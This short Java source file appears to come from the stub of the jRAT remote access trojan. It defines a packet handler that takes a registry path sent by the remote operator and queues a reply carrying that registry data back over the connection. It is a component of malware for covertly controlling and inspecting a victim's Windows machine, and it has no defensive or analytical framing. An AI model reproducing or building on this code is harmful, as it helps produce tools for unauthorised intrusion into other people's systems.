package jrat.module.registry;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.incoming.AbstractIncomingPacket;

public class Packet79BrowseRegistry extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();

		con.addToSendQueue(new Packet54Registry(path));
	}

}
